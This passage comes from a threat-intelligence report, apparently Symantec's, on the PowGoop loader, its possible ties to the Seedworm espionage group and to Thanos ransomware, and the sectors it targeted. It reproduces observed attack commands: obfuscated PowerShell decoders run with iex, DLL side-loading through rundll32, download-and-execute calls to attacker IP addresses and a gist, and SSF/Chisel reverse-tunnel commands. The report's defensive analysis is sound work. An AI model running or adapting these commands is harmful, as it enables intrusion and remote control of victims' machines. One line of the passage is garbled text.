This tool is](https://www.hobrasoft.cz/en/remadmin/)\nused to execute PowerShell to read and decode the contents of a file which is used to execute the contents in memory. It appears this code is\nused to load PowGoop’s main DLL (goopdate.dll) via rundll32.exe.\n\npowershell -exec bypass \"$a=gc C:\\WINDOWS\\TEMP\\ManyaBetta;del C:\\WINDOWS\\TEMP\\ManyaBetta;function Gabrielle($OliviaTomi)\n{$Emlyn = [System.Convert]::FromBase64String($OliviaTomi);return [System.Text.Encoding]::UTF8.GetString($Emlyn);}function\nTina($Daisi){$OliviaTomi = [System.Text.Encoding]::UTF8.GetBytes($Daisi);for ($TheresitaNitaChad=0; $TheresitaNitaChad -le\n$OliviaTomi.count -1; $TheresitaNitaChad++){$OliviaTomi[$TheresitaNitaChad] = $OliviaTomi[$TheresitaNitaChad] - 2;}return\n\n[System.Text.Encoding]::UTF8.GetString($OliviaTomi);}function GlyndaMaureen($OliviaTomi){$Rosalinde = Gabrielle\n$OliviaTomi;$LeonaJolene = Tina $Rosalinde;return $LeonaJolene;};$t =GlyndaMaureen($a);&($ShellId[1] + 'ex') $t;\"\n\nA feature of these files is that they have distinctive variable and function naming that resembles human names concatenated together. We\nhave no reason to believe that these are actual people’s names.\n\nOn several of the victim machines, a ZIP file called ‘google.zip’ was also found present in the same directory. How the ZIP file arrives on the\nvictim’s computer remains unknown. The ZIP contains a mix of legitimate Google executables and malicious DLL files. A legitimate\n‘googleupdate.exe’ file is used to side load PowGoop via rundll32.exe. PowGoop loaders are used to decode and execute the contents of a file\ncalled ‘config.txt’. All config.txt files found to date contained PowerShell scripts that download and execute more PowerShell code.\n\npowershell -exec bypass \"function bdec($in){$out = [System.Convert]::FromBase64String($in);return\n\n[System.Text.Encoding]::UTF8.GetString($out);}function bDec2($szinput){$in = [System.Text.Encoding]::UTF8.GetBytes($szinput);for\n($i=0; $i -le $in.count -1; $i++){$in[$i] = $in[$i] - 2;}return [System.Text.Encoding]::UTF8.GetString($in);}function bDd($in){$dec = bdec\n$in;$temp = bDec2 $dec;return $temp;}$a=get-content \" config.txt\";$t =bDd $a;&($ShellId[1] + 'ex') $t;\"\nRundll32.exe CSIDL_COMMON_APPDATA\\andreavania\\goopdate.dll,dllregisterserver\n\nIn some cases, PowGoop is used to launch ‘Wscript.exe’ to execute an unknown VBS file called ‘v.txt’.\n\n\"CSIDL_SYSTEM\\wscript.exe\" /e:vbs CSIDL_PROFILE\\[REDACTED]\\documents\\v.txt\n\n\n-----\n\nS a y, Sy a tec a so obse ed eg t ate too s (ope ss e e) a d a do oade too (ss eay3 d ) p ese t t e sa e d ecto es used to\ndownload additional tools:\n\nCSIDL_SYSTEM\\rundll32.exe CSIDL_COMMON_APPDATA\\georgettaemilee\\ssleay32.dll\n,DllRegisterServer http://107.173.141.103:443/downloadc.php?key=[REDACTED]\nCSIDL_SYSTEM\\rundll32.exe CSIDL_COMMON_APPDATA\\samariaantonina\\ssleay32.dll,DllRegisterServer\nhttp://107.173.141.114:443/downloadc.php?key=[REDACTED]\n\nSimilar download requests were also observed via PowerShell:\n\npowershell -exec bypass $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=\n\n[Net.CredentialCache]::DefaultCredentials;$AaA = \"Do\";$AaB = \" wnloadStr\";$AaC = \"ing\";$s=\"$AaA$AaB$AaC\"\n('http://23.95.220.166:80/download.php?k=564');$s;\"\n$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=\n\n[Net.CredentialCache]::DefaultCredentials;start-sleep\n10;$s=$V.DownloadString('http://104.168.44.16:443/H6qy8yvXhV69mF8CgpmWwKb1oV19xMqaI');iex($s)\n\nDuring PowGoop activity, Symantec also observed the attackers using the Secure Sockets Funneling tool as well as Chisel suggesting a link\nbetween the two sets of activity.\n\n\"CSIDL_PROFILE\\[REDACTED]\\documents\\ussf.exe\" -c CSIDL_PROFILE\\[REDACTED]\\documents\\config.txt -F 9900 -p [REDACTED]\n107.172.97.172\nCSIDL_COMMON_APPDATA\\sharp.cmd client 107.175.0.140:443 R:8888:127.0.0.1:9999\nCSIDL_COMMON_APPDATA\\sharp.cmd server -p [REDACTED] --socks5\n\n## Additional links between Seedworm and PowGoop\n\nIn several recent Seedworm attacks, PowGoop was used on computers that were also infected with known Seedworm malware\n(Backdoor.Mori). In addition to this, activity involving Seedworm’s Powerstats (aka Powermud) backdoor appears to have been superseded by\nDLL side-loading of PowGoop.\n\nAdditionally, during PowGoop activity, we also observed the attackers downloading tools and some unknown content from GitHub repos,\n[similar to what has been reported on Seedworm‘s Powerstats in the past.](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/seedworm-espionage-group?es_p=8239106)\n\npowershell -exec bypass $e=new-object net.webclient;$e.proxy=[Net.WebRequest]::GetSystemWebProxy();$e.Proxy.Credentials=\n\n[Net.CredentialCache]::DefaultCredentials;$aa=$e.DownloadString('https://gist.githubusercontent.com/ffcommax/24587757d3328672954e41\n\nThese patterns of activity beg the question as to whether PowGoop is actually an evolution of Powerstats rather than a completely new tool. To\ndate, there is insufficient evidence to confirm this hypothesis. However, there are several similarities between the tools:\n\nUse of hard-coded GUID tokens and proxy URLs for command and control (C&C) communications\nFetching and executing commands from C&C servers using PowerShell\nSome low-confidence similarities in code structure and encoding techniques\n\nWhile none of this is sufficient to confirm that PowGoop has evolved from Powerstats, Symantec continues to monitor the activity of Seedworm\nfor any additional evidence.\n\n## Thanos ransomware link\n\nPowGoop has, in recent weeks, been loosely linked to a variant of ransomware known as Thanos. Thanos is an aggressive form of\nransomware which, in addition to encryption, will also attempt to overwrite the master boot record (MBR) of the infected computer.\n\n[Our peers at Palo Alto Networks reported that PowGoop was found at a Middle Eastern state-run organization which was also hit by Thanos.](https://unit42.paloaltonetworks.com/thanos-ransomware/)\nThis lead to the suspicion that the Thanos attackers were using PowGoop in their attacks; however, Palo Alto could not confirm the connection.\n\nSymantec has not found any evidence of a wiper or ransomware on computers infected with PowGoop. This suggests that either the\nsimultaneous presence of PowGoop and Thanos in one attack was a coincidence or, if the two are linked, that PowGoop is not used\nexclusively to deliver Thanos.\n\nSymantec uncovered attacks involving PowGoop against organizations in Iraq, Afghanistan, Israel, Turkey, Azerbaijan, Georgia, Cambodia,\nand Vietnam. Sectors targeted included governments, technology, telecoms, oil and gas, real estate, and education.\n\n## Vigilance required\n\nSeedworm has been one of the most active Iran-linked groups in recent months, mounting apparent intelligence-gathering operations across\nthe Middle East. While the connection between PowGoop and Seedworm remains tentative, it may suggest some retooling on Seedworm’s\npart. Any organizations who do find evidence of PowGoop on their networks should exercise extreme caution and perform a thorough\ninvestigation.\n\n\n-----\n\n## Protection\n\nThe following protections are in place to protect customers against Seedworm attacks:\n\n**File-based protection**\n\nBackdoor.Mori\nBackdoor.Powemuddy\nDownloader.Covic\n\n**Network-based protection**\n\nSystem Infected: Trojan.Backdoor Activity 243\n\n## Indicators of Compromise\n\n About the Author\n\n### Threat Hunter Team\n\n**Symantec**\n\nThe Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced\nprotection in Symantec products, and offer analysis that helps customers respond to attacks.\n\n\n-----",
